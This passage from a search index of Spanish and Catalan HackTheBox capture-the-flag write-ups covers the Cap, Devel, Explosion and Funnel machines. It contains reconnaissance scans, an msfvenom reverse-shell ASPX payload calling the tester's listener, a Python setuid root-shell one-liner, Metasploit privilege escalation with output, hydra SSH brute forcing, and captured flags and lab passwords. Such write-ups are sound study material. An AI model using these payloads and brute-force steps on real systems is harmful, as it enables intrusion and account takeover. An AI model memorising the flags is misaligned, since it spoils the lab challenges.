<p></p>"},{"location":"Writeup-ctfs/HackTheBox/BoardLight/#banderas","title":"Bandera(s)","text":"<p>User:  8551aca9cdeb37137c17fd1fa350ea1a Root: 75a52752844333fea88a3d9c60494889 </p>"},{"location":"Writeup-ctfs/HackTheBox/Cap/","title":"Cap","text":"<p>Plataforma: HackTheBox OS: Linux Level: Easy Status: Done Complete: Yes Created time: 2 de diciembre de 2024 13:28 IP: 10.10.10.245</p>"},{"location":"Writeup-ctfs/HackTheBox/Cap/#reconocimiento","title":"Reconocimiento","text":"<p>NMap all ports:</p> <pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allports\n</code></pre> <p>Resultats:</p> <p> </p> <p>Veiem que canviant el valor del data a 0 mostra un fitxer pcap S'obre amb Wireshark i mostra credencials de FTP</p> <p></p> <p>User: nathan password: Buck3tH4TF0RM3!</p>"},{"location":"Writeup-ctfs/HackTheBox/Cap/#analisis-de-vulnerabilidades","title":"An\u00e1lisis de vulnerabilidades","text":"<p>Entrem per ftp i obtenim el flag de user:</p> <p></p> <p>Entrem per ssh amb les mateixes credencials:</p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Cap/#explotacion-de-vulnerabilidades","title":"Explotaci\u00f3n de vulnerabilidades","text":"<p>busquem les capabiliies per escala privilegis</p> <pre><code>getcap -r / 2&gt;/dev/null\n</code></pre> <p>ens troba:</p> <p></p> <p>Veiem qu el path /usr/bin/python3.8 te les capabilities habilitades</p>"},{"location":"Writeup-ctfs/HackTheBox/Cap/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Busquem a gtfobins com explotar el binari:</p> <pre><code> ./usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Cap/#banderas","title":"Bandera(s)","text":"<p>User: Buck3tH4TF0RM3 Root: 8c709aec8f05bee68669d9ec4e914451 </p>"},{"location":"Writeup-ctfs/HackTheBox/Devel/","title":"Devel","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Windows</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 2 de febrero de 2025 15:36</p> <p>\ud83c\udf10 IP: <code>10.10.10.5</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Devel/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Siste</p> <pre><code>whichSystem.py 10.10.10.5\n\n    10.10.10.5 (ttl -&gt; 127): Windows\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Devel/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.10.5 -oG targeted\n\nPORT   STATE SERVICE REASON\n21/tcp open  ftp     syn-ack ttl 127\n80/tcp open  http    syn-ack ttl 127\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Devel/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p21,80 -sCV 10.10.10.5 -oN targeted\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client\n| 03-17-17  04:37PM                  689 iisstart.htm\n|_03-17-17  04:37PM               184946 welcome.png\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp open  http    Microsoft IIS httpd 7.5\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: IIS7\n| http-methods: \n|_  Potentially risky methods: TRACE\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>21/tcp open  ftp     Microsoft ftpd</li> <li>80/tcp open  http    Microsoft IIS httpd 7.5</li> </ul> </li> <li> <p>Enumeraci\u00f3n FTP</p> <p>Vemos que tiene permitido el acceso con usuario \u201cAnonymous\u201d</p> <pre><code>ftp anonymous@10.10.10.5\nConnected to 10.10.10.5.\n220 Microsoft FTP Service\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||49158|)\n125 Data connection already open; Transfer starting.\n03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client\n03-17-17  04:37PM                  689 iisstart.htm\n03-17-17  04:37PM               184946 welcome.png\n226 Transfer complete.\nftp&gt; cd aspnet_client\n250 CWD command successful.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||49160|)\n125 Data connection already open; Transfer starting.\n03-18-17  01:06AM       &lt;DIR&gt;          system_web\n226 Transfer complete.\nftp&gt; cd system_web\n250 CWD command successful.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||49162|)\n125 Data connection already open; Transfer starting.\n03-18-17  01:06AM       &lt;DIR&gt;          2_0_50727\n226 Transfer complete.\nftp&gt; cd 2_0_50727\n250 CWD command successful.\nftp&gt; ls\n</code></pre> <p>Vemos que podemos subir ficheros al servidor y vemos que se trata de un IIS que usa ASPnet.</p> <p>Generamos un payload con MSFvenom para obtener una rever con meterpreter</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.15 LPORT=4444 -f aspx &gt; aspx_met_10.10.16.15_4444.aspx\n</code></pre> <p>Lo subimos a la raiz del ftp</p> <pre><code>ftp&gt; put aspx_met_10.10.16.15_4444.aspx\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Devel/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/HackTheBox/Devel/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Creamos en metasploit una sesion para obtener la rever:</p> <pre><code>msf &gt; use exploit/multi/handler\nmsf &gt; set payload_windows/meterpreter/reverse_tcp\nmsf &gt; set LHOST 10.10.16.15\nmsf &gt; run\n</code></pre> <p>Accedermos al fichero que hemos subido con </p> <pre><code>http://10.10.10.5/aspx_met_10.10.16.15_4444.aspx\n</code></pre> <p>Obtenemos la session de meterpreter. Vemos que esta el usuario babis per no tenemos permisos para ver nada.</p> <p>Siguiendo las notas de HTB usamos el modulo de reconocimiento : local_exploit_suggestion</p> <pre><code># Primero ponemos nuestra session en backgrount\nmsf &gt; cntl+Z\nmsf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1\nmsf6 post(multi/recon/local_exploit_suggester) &gt; use\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Devel/#explotacion-2","title":"Explotaci\u00f3n 2","text":""},{"location":"Writeup-ctfs/HackTheBox/Devel/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/HackTheBox/Devel/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Exploits sugeridos</p> <pre><code> #   Name                                                           Potentially Vulnerable?  Check Result\n -   ----                                                           -----------------------  ------------\n 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.\n 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.\n 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!\n 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.\n 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.\n 6   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.\n 7   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.\n 8   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.\n 9   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.\n 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.\n 11  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.\n 12  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.\n 13  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.\n 14  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.\n 15  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.\n 16  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.\n</code></pre> <p>Probamos con varios pero no funciona. </p> <p>Encontramos que funciona:</p> <pre><code>msf &gt; exploit/windows/local/ms10_015_kitrap0d  \nmsf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf6 exploit(windows/local/ms10_015_kitrap0d) &gt; run\n[-] Handler failed to bind to 10.10.16.15:4444:-  -\n[-] Handler failed to bind to 0.0.0.0:4444:-  -\n[*] Reflectively injecting payload and triggering the bug...\n[*] Launching netsh to host the DLL...\n[+] Process 2184 launched.\n[*] Reflectively injecting the DLL into 2184...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Exploit completed, but no session was created.\nmsf6 exploit(windows/local/ms10_015_kitrap0d) &gt; run\n[*] Started reverse TCP handler on 10.10.16.15:4444 \n[*] Reflectively injecting payload and triggering the bug...\n[*] Launching msiexec to host the DLL...\n[+] Process 716 launched.\n[*] Reflectively injecting the DLL into 716...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (177734 bytes) to 10.10.10.5\n[*] Meterpreter session 2 opened (10.10.16.15:4444 -&gt; 10.10.10.5:49211) at 2025-02-02 17:20:23 +0100\n\nmeterpreter &gt; ls\n\nListing: c:\\users\\babis\\Desktop\n===============================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100666/rw-rw-rw-  282   fil   2017-03-17 15:17:51 +0100  desktop.ini\n100444/r--r--r--  34    fil   2025-02-02 15:36:39 +0100  user.txt\n\nmeterpreter &gt; type us\n[-] Unknown command: type. Run the help command for more details.\nmeterpreter &gt; cat user.txt \n993f957c1590e6b4afbb134baea8776f\n</code></pre> <p>User Flag: 993f957c1590e6b4afbb134baea8776f</p> <pre><code>meterpreter &gt; ls\nListing: c:\\users\\Administrator\\Desktop\n=======================================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100666/rw-rw-rw-  282   fil   2017-03-18 00:16:53 +0100  desktop.ini\n100444/r--r--r--  34    fil   2025-02-02 15:36:39 +0100  root.txt\n\nmeterpreter &gt; cat root.txt \n66754e88f3a4b81e993d865d3f4353eb\n</code></pre> <p>Root flag: 66754e88f3a4b81e993d865d3f4353eb</p>"},{"location":"Writeup-ctfs/HackTheBox/Devel/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina facil en la que he aprendido a manejar un poco mejor metasploit. Me he estancado en ver como ejecutar la rever en el servidor. Intentaba explotarlo a traves del enlace del html"},{"location":"Writeup-ctfs/HackTheBox/Explosion/","title":"Explosion","text":"<p>Plataforma: HackTheBox OS: Windows Level: Very Easy Status: Done Complete: Yes Created time: 4 de enero de 2025 21:01 IP: 10.129.1.13</p>"},{"location":"Writeup-ctfs/HackTheBox/Explosion/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Explosion/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.1.13 -oG allports\n\nPORT      STATE SERVICE       REASON\n135/tcp   open  msrpc         syn-ack ttl 127\n139/tcp   open  netbios-ssn   syn-ack ttl 127\n445/tcp   open  microsoft-ds  syn-ack ttl 127\n3389/tcp  open  ms-wbt-server syn-ack ttl 127\n5985/tcp  open  wsman         syn-ack ttl 127\n47001/tcp open  winrm         syn-ack ttl 127\n49664/tcp open  unknown       syn-ack ttl 127\n49665/tcp open  unknown       syn-ack ttl 127\n49666/tcp open  unknown       syn-ack ttl 127\n49667/tcp open  unknown       syn-ack ttl 127\n49668/tcp open  unknown       syn-ack ttl 127\n49669/tcp open  unknown       syn-ack ttl 127\n49670/tcp open  unknown       syn-ack ttl 127\n49671/tcp open  unknown       syn-ack ttl 127\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Explosion/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -sCV 10.129.1.13 -oN targeted\n\nPORT      STATE SERVICE       VERSION\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: EXPLOSION\n|   NetBIOS_Domain_Name: EXPLOSION\n|   NetBIOS_Computer_Name: EXPLOSION\n|   DNS_Domain_Name: Explosion\n|   DNS_Computer_Name: Explosion\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-01-04T20:04:51+00:00\n| ssl-cert: Subject: commonName=Explosion\n| Not valid before: 2025-01-03T19:56:16\n|_Not valid after:  2025-07-05T19:56:16\n|_ssl-date: 2025-01-04T20:04:59+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2025-01-04T20:04:55\n|_  start_date: N/A\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>135/tcp   open  msrpc         syn-ack ttl 127</li> <li>139/tcp   open  netbios-ssn   syn-ack ttl 127</li> <li>445/tcp   open  microsoft-ds  syn-ack ttl 127</li> <li>3389/tcp  open  ms-wbt-server syn-ack ttl 127</li> <li>5985/tcp  open  wsman         syn-ack ttl 127</li> <li>47001/tcp open  winrm         syn-ack ttl 127</li> <li></li> </ul> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Explosion/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos a conectarnos por rdp con usuario administrador"},{"location":"Writeup-ctfs/HackTheBox/Explosion/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<pre><code>xfreerdp3 /u:Administrator /v:10.129.1.13\n</code></pre> <p>Obtenemos login con usuario administrador y la flag de root.</p> <p>Flag: 951fa96d7830c451b536be5a6be008a0</p>"},{"location":"Writeup-ctfs/HackTheBox/Explosion/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina f\u00e1cil sin escalada ni complicaciones"},{"location":"Writeup-ctfs/HackTheBox/Funnel/","title":"Funnel","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 7 de enero de 2025 21:15</p> <p>\ud83c\udf10 IP: <code>10.129.88.226</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.88.226 -oG allports\n\nPORT   STATE SERVICE REASON\n21/tcp open  ftp     syn-ack ttl 63\n22/tcp open  ssh     syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p21,22 -sCV 10.129.88.226 -oN targeted\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> </li> <li> <p>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</p> </li> <li>21/tcp open  ftp     vsftpd 3.0.3</li> </ul> <pre><code>21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.16.68\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n</code></pre> <ul> <li> <p>Enumeramos FTP (port 21)</p> <pre><code># Conectamos con el FTP sin credenciales\n\n ftp anonymous@10.129.88.226\n ftp&gt; ls\n229 Entering Extended Passive Mode (|||58764|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup\n226 Directory send OK.\nftp&gt; cd mail_backup\n250 Directory successfully changed.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||18439|)\n150 Here comes the directory listing.\n-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf\n-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022\n\n# Descargamos todos los ficheros del directorio\nftp&gt; mget *\n226 Transfer complete.\n713 bytes received in 00:00 (2.67 KiB/s)\n</code></pre> <p>Revisamos los documentos descargados</p> <pre><code>cat welcome_28112022\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: welcome_28112022\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 Frome: root@funnel.htb\n   2   \u2502 To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb\n   3   \u2502 Subject:Welcome to the team!\n</code></pre> <p>Enumeramos los siguientes usuarios: </p> <ul> <li>root</li> <li>optimus</li> <li>albert</li> <li>andreas</li> <li>christine</li> <li>maria</li> </ul> <p>Enumerando el otro archivo vemos :</p> <p></p> <p>Por lo que tenemos un password potencial: funnel123#!#</p> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Intentamos el acceso con las credenciales"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Creamos dos listas, una con el password y la otra con los usuarios para ver con cual aplica</p> <p></p> <p></p> <pre><code>\u276f hydra -L users.txt -P password.txt 10.129.88.226 ssh # 10.129.88.226 ssh\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 21:33:52\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task\n[DATA] attacking ssh://10.129.88.226:22/\n[22][ssh] host: 10.129.88.226   login: christine   password: funnel123#!#\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-07 21:33:59\n</code></pre> <p>Encontramos usuario \u201cChristine\u201d con password \u201cfunnel123#!#</p>"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#explotacion-2","title":"Explotaci\u00f3n 2","text":"<p>Accedemos por ssh como usuario \u201cChristine\u201d y password anterior</p> <pre><code>\u276f ssh christine@10.129.88.226\nchristine@funnel:~$\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#explotacion-3","title":"Explotaci\u00f3n 3","text":"<p>Vemos que en la maquina, hay corriendo el servicio postresql , pero \u00fanicamente en el local host</p> <p>Hacemos local port forwarding</p> <pre><code>\u276f ssh -L 1111:127.0.0.1:5432 christine@10.129.88.226\n</code></pre> <p>Una vez establecida conexi\u00f3n por SSH, conectamos desde nuestra maquina (local) a psql</p> <pre><code>\u276f psql -h 127.0.0.1 -p 1111 -U christine\n</code></pre> <p>Enumeramos la BD:</p> <pre><code># \\l para listar todas las bases de datos\n\nchristine-# \\l\n\nListado de base de datos\nNombre   |   Due\u00f1o   | Codificaci\u00f3n | Proveedor de locale |  Collate   |   Ctype    | Configuraci\u00f3n regional | Reglas ICU: |       Privilegios       \n-----------+-----------+--------------+---------------------+------------+------------+------------------------+-------------+-------------------------\n christine | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | \n postgres  | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | \n secrets   | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | \n template0 | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | =c/christine           +\n           |           |              |                     |            |            |                        |             | christine=CTc/christine\n template1 | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | =c/christine           +\n           |           |              |                     |            |            |                        |             | christine=CTc/christine\n</code></pre> <p>Vemos la tabla secrets. </p> <pre><code># \\c para cambiar de base de datos\n# \\dt para ver el contenido de la base de datos\n\nchristine-# \\c secrets\npsql (17.2 (Debian 17.2-1), servidor 15.1 (Debian 15.1-1.pgdg110+1))\nAhora est\u00e1 conectado a la base de datos \u00absecrets\u00bb con el usuario \u00abchristine\u00bb.\nsecrets-# \\dt\n        Listado de relaciones\n Esquema | Nombre | Tipo  |   Due\u00f1o   \n---------+--------+-------+-----------\n public  | flag   | tabla | christine\n(1 fila)\n\n# SELECT * FROM &lt;table_name&gt;; Para ver contenido\n\nsecrets-# select * from flag;\nvalue               \n----------------------------------\n cf277664b1771217d7006acdea006db1\n(1 fila)\n</code></pre> <p>Flag: cf277664b1771217d7006acdea006db1</p>"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 No hay escalada de privilegios"},{"location":"Writeup-ctfs/HackTheBox/Funnel/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina facil y interesante. Me ha servido para aprender conceptos de local port forwardin (ssh)"},{"location":"Writeup-ctfs/HackTheBox/GoodGames/","title":"GoodGames","text":"<p>Plataforma: HackTheBox OS: Linux Level: Easy Status: Not started Complete: No Created time: 23 de enero de 2025 20:22</p>"},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Whichsystem</p> <pre><code>whichSystem.py 10.10.11.130\n\n    10.10.11.130 (ttl -&gt; 63): \n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.11.130 -oG targeted\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -sCV -p80 10.10.11.130 -oN targeted\n\nORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.51\n|_http-title: GoodGames | Community and Store\n|_http-server-header: Werkzeug/2.0.2 Python/3.9.2\nService Info: Host: goodgames.htb\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>80/tcp open  http    Apache httpd 2.4.51</li> </ul> </li> </ul> <p>Whatweb</p> <pre><code>whatweb 10.10.11.130\nhttp://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]\n</code></pre> <ul> <li> <p>Enumaci\u00f3n web</p> <pre><code>\u276f gobuster dir -u http://goodgames.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --exclude-length 9265\n</code></pre> <p></p> </li> </ul> <p>Buscamos subdominios</p> <pre><code>\u276f ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -u http://goodgames.htb -H \"HOST:FUZZ.goodgames.htb\" -fs 85107\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#explotacion-1","title":"Explotaci\u00f3n 1","text":""},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#explotacion-2","title":"Explotaci\u00f3n 